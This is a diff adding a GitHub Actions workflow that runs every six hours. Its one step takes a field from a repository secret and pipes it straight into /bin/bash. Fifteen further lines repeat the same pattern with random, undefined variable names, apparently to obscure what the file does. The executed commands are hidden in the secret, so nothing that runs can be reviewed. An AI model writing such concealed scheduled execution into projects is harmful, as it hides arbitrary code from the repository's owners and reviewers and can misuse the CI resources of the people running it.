@@ -1,0 +1,33 @@
+name: hekangjiexi
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '1 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: hekangjiexi
+        env:
+          eg7: ${{ secrets.eg7 }}
+        run: |
+          echo $eg7 | jq -r .s31 | /bin/bash
+          echo $zewh989 | jq -r .nqtd115 | /bin/bash
+          echo $hlrx45 | jq -r .n8 | /bin/bash
+          echo $a510 | jq -r .psc076 | /bin/bash
+          echo $y3 | jq -r .fdlp10143 | /bin/bash
+          echo $unad300 | jq -r .ncuh279 | /bin/bash
+          echo $d5996 | jq -r .al09 | /bin/bash
+          echo $naa8703 | jq -r .jmu1256 | /bin/bash
+          echo $rar159 | jq -r .k9031 | /bin/bash
+          echo $mvt645 | jq -r .xrt207 | /bin/bash
+          echo $r80 | jq -r .pefd0 | /bin/bash
+          echo $gezhv018 | jq -r .eni59954 | /bin/bash
+          echo $ffyin26 | jq -r .ukya1 | /bin/bash
+          echo $ixhv375 | jq -r .qp59398 | /bin/bash
+          echo $pb67587 | jq -r .otvmf06 | /bin/bash
+          echo $ibiyt54970 | jq -r .rjg12 | /bin/bash
+
